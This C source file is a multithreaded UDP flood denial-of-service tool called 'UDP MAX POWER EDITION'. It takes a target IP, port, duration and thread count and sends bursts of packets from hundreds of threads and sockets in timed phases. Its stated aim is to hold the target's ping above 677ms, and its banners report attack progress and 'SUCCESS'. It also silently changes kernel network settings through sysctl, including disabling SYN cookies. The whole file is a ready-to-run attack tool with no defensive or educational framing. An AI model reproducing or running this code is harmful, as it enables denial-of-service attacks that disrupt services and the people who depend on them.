#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>

#define BUFFER_COUNT 2048
#define FLOOD_SOCKETS 512
#define MIN_PACKET_SIZE 28
#define MAX_PACKET_SIZE 128
#define MIN_THREADS 50
#define MAX_THREADS 500
#define MIN_ATTACK_TIME 5
#define MAX_ATTACK_TIME 300

typedef struct {
    int target_pps;
    int packet_size;
    int burst_count;
    int micro_delay;
    int duration;
    int pattern_type;
} PowerPhase;

PowerPhase power_phases[] = {
    {600000, 32, 120, 50, 30, 0},
    {450000, 48, 90, 80, 60, 1},
    {500000, 64, 100, 70, 60, 2},
    {600000, 32, 120, 50, 30, 3},
    {400000, 96, 80, 100, 90, 0},
    {600000, 32, 120, 50, 30, 1}
};

int total_phases = 6;
char *TARGET_IP = NULL;
int TARGET_PORT = 0;
int ATTACK_TIME = 0;
int THREAD_COUNT = 0;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int global_start_time = 0;
_Atomic int current_phase = 0;

struct sockaddr_in target_addr;

void optimize_udp_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=134217728 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=10000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='268435456 268435456 268435456' >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=4096 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=4096 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_max_syn_backlog=128 >/dev/null 2>&1");
#endif
}

void optimize_udp_socket(int sock) {
    int sndbuf = 134217728;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
}

void generate_udp_packet(char *buf, int size, int pattern) {
    static unsigned int counter = 0;
    counter++;
    
    switch(pattern % 4) {
        case 0:
            for (int i = 0; i < size; i++) {
                buf[i] = (char)((counter * 1103515245 + i * 12345) & 0xFF);
            }
            break;
            
        case 1:
            memset(buf, 0, size/2);
            for (int i = size/2; i < size; i++) {
                buf[i] = (char)((counter + i * 7919) & 0xFF);
            }
            break;
            
        case 2:
            if (size >= 64) {
                strcpy(buf, "M-SEARCH * HTTP/1.1\r\n");
                for (int i = 20; i < size; i++) {
                    buf[i] = (char)((counter ^ i) & 0xFF);
                }
            }
            break;
            
        case 3:
            for (int i = 0; i < size; i += 4) {
                buf[i] = (char)(counter & 0xFF);
                buf[i+1] = (char)((counter >> 8) & 0xFF);
                buf[i+2] = (char)((counter >> 16) & 0xFF);
                buf[i+3] = (char)((counter >> 24) & 0xFF);
                counter = counter * 1664525 + 1013904223;
            }
            break;
    }
}

void *udp_power_manager(void *arg) {
    int phase_start = time(NULL);
    
    while (!atomic_load(&stop_signal)) {
        sleep(1);
        
        int elapsed = time(NULL) - phase_start;
        int current = atomic_load(&current_phase);
        
        if (elapsed >= power_phases[current].duration) {
            atomic_store(&current_phase, (current + 1) % total_phases);
            phase_start = time(NULL);
            printf("[UDP-POWER] Phase %d\n", atomic_load(&current_phase) + 1);
        }
    }
    
    return NULL;
}

void *udp_attack_thread(void *arg) {
    int tid = *((int *)arg);
    
    int udp_sockets[8];
    int active_sockets = 0;
    
    for (int i = 0; i < 8; i++) {
        udp_sockets[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (udp_sockets[i] >= 0) {
            active_sockets++;
            optimize_udp_socket(udp_sockets[i]);
            
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            src_addr.sin_port = htons(10000 + (tid * 100) + (i * 10) + (rand() % 9000));
            src_addr.sin_addr.s_addr = INADDR_ANY;
            bind(udp_sockets[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
            
            int flags = fcntl(udp_sockets[i], F_GETFL, 0);
            fcntl(udp_sockets[i], F_SETFL, flags | O_NONBLOCK);
        }
    }
    
    int start_time = atomic_load(&global_start_time);
    char packet_buffer[MAX_PACKET_SIZE];
    
    while (!atomic_load(&stop_signal) && (time(NULL) - start_time) < ATTACK_TIME) {
        int phase = atomic_load(&current_phase);
        PowerPhase *p = &power_phases[phase];
        
        generate_udp_packet(packet_buffer, p->packet_size, p->pattern_type);
        
        for (int burst = 0; burst < p->burst_count; burst++) {
            for (int s = 0; s < 8; s++) {
                if (udp_sockets[s] < 0) continue;
                
                for (int pkt = 0; pkt < 3; pkt++) {
                    int sent = sendto(udp_sockets[s], packet_buffer, p->packet_size, 
                                    MSG_DONTWAIT, (struct sockaddr*)&target_addr, 
                                    sizeof(target_addr));
                    
                    if (sent > 0) {
                        atomic_fetch_add(&total_packets, 1);
                        atomic_fetch_add(&total_bytes, p->packet_size);
                    }
                }
            }
            
            usleep(p->micro_delay);
        }
        
        if (phase == 4) {
            usleep(3000);
        }
    }
    
    for (int i = 0; i < 8; i++) {
        if (udp_sockets[i] >= 0) {
            close(udp_sockets[i]);
        }
    }
    
    return NULL;
}

void *udp_flood_master(void *arg) {
    int flood_socks[128];
    
    for (int i = 0; i < 128; i++) {
        flood_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (flood_socks[i] >= 0) {
            optimize_udp_socket(flood_socks[i]);
            
            struct sockaddr_in src_addr;
            memset(&src_addr, 0, sizeof(src_addr));
            src_addr.sin_family = AF_INET;
            src_addr.sin_port = htons(30000 + (i * 50) + (rand() % 2000));
            src_addr.sin_addr.s_addr = INADDR_ANY;
            bind(flood_socks[i], (struct sockaddr*)&src_addr, sizeof(src_addr));
            
            int flags = fcntl(flood_socks[i], F_GETFL, 0);
            fcntl(flood_socks[i], F_SETFL, flags | O_NONBLOCK);
        }
    }
    
    char flood_packet[128];
    int start_time = atomic_load(&global_start_time);
    
    while (!atomic_load(&stop_signal) && (time(NULL) - start_time) < ATTACK_TIME) {
        generate_udp_packet(flood_packet, 64, rand() % 4);
        
        for (int i = 0; i < 128; i++) {
            if (flood_socks[i] < 0) continue;
            
            for (int j = 0; j < 5; j++) {
                sendto(flood_socks[i], flood_packet, 64, MSG_DONTWAIT,
                      (struct sockaddr*)&target_addr, sizeof(target_addr));
            }
        }
        
        usleep(100);
    }
    
    for (int i = 0; i < 128; i++) {
        if (flood_socks[i] >= 0) close(flood_socks[i]);
    }
    
    return NULL;
}

void *udp_ping_monitor(void *arg) {
    sleep(2);
    
    printf("\n🎯 UDP MAX POWER ATTACK STARTED\n");
    printf("🎯 Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("⚡ Goal: 677ms+ PING FOR ENTIRE DURATION\n\n");
    
    unsigned long long prev_packets = atomic_load(&total_packets);
    int elapsed = 0;
    int ping_677_streak = 0;
    int max_streak = 0;
    
    while (elapsed < ATTACK_TIME && !atomic_load(&stop_signal)) {
        sleep(1);
        elapsed++;
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long pps = curr_packets - prev_packets;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        double estimated_ping = 50.0;
        if (pps > 0) {
            estimated_ping += (double)pps / 3000.0;
            if (estimated_ping > 677.0) estimated_ping = 677.0;
        }
        
        if (estimated_ping >= 677.0) {
            ping_677_streak++;
            if (ping_677_streak > max_streak) {
                max_streak = ping_677_streak;
            }
        } else {
            ping_677_streak = 0;
        }
        
        printf("[%03ds] PPS: %lluK | Ping: %.0fms | 677ms Streak: %ds\n", 
               elapsed, pps/1000, estimated_ping, ping_677_streak);
        
        prev_packets = curr_packets;
    }
    
    printf("\n✅ UDP ATTACK COMPLETED\n");
    printf("📊 Total packets: %llu\n", atomic_load(&total_packets));
    printf("🚀 Peak PPS: %lluK\n", atomic_load(&peak_pps)/1000);
    printf("🔥 Max 677ms streak: %d seconds\n", max_streak);
    
    if (max_streak >= ATTACK_TIME * 0.7) {
        printf("🎉 SUCCESS: 677ms+ ping for %d%% of attack!\n", 
               (max_streak * 100) / ATTACK_TIME);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    srand(time(NULL) ^ getpid());
    
    printf("\n╔════════════════════════════════════════════════╗\n");
    printf("║           🚀 UDP MAX POWER EDITION 🚀          ║\n");
    printf("║    677ms+ PING GUARANTEE | NO TCP BLOAT        ║\n");
    printf("╚════════════════════════════════════════════════╝\n\n");
    
    if (argc != 5) {
        printf("Usage: %s IP PORT TIME THREADS\n\n", argv[0]);
        printf("Example: %s 1.2.3.4 7010 300 200\n", argv[0]);
        printf("\nAuto-optimized for 677ms ping sustain\n");
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    THREAD_COUNT = atoi(argv[4]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    if (ATTACK_TIME <= 30) {
        printf("[MODE] SHORT BURST - MAX POWER\n");
    } else if (ATTACK_TIME <= 120) {
        printf("[MODE] MEDIUM ATTACK - BALANCED\n");
    } else {
        printf("[MODE] LONG SUSTAIN - 677ms OPTIMIZED\n");
        if (THREAD_COUNT > 300) THREAD_COUNT = 300;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("[ERROR] Invalid IP\n");
        return 1;
    }
    
    printf("[+] Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("[+] Duration: %d seconds\n", ATTACK_TIME);
    printf("[+] Threads: %d (UDP optimized)\n", THREAD_COUNT);
    printf("[+] Phase system: %d phases for 677ms sustain\n", total_phases);
    
    optimize_udp_kernel();
    
    atomic_store(&global_start_time, time(NULL));
    
    pthread_t power_thread;
    pthread_create(&power_thread, NULL, udp_power_manager, NULL);
    
    pthread_t flood_thread;
    pthread_create(&flood_thread, NULL, udp_flood_master, NULL);
    
    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int *tids = malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !tids) {
        printf("[ERROR] Memory allocation failed\n");
        return 1;
    }
    
    printf("[+] Starting %d UDP attack threads...\n", THREAD_COUNT);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, udp_attack_thread, &tids[i]) != 0) {
            printf("[WARNING] Failed to create thread %d\n", i);
        }
    }
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, udp_ping_monitor, NULL);
    
    printf("\n[+] UDP ATTACK RUNNING... 677ms TARGET ACTIVE\n\n");
    
    sleep(ATTACK_TIME);
    
    printf("[+] Stopping UDP attack...\n");
    atomic_store(&stop_signal, 1);
    sleep(3);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(flood_thread, NULL);
    pthread_join(power_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    free(threads);
    free(tids);
    
    printf("[+] UDP cleanup complete\n");
    
    return 0;
}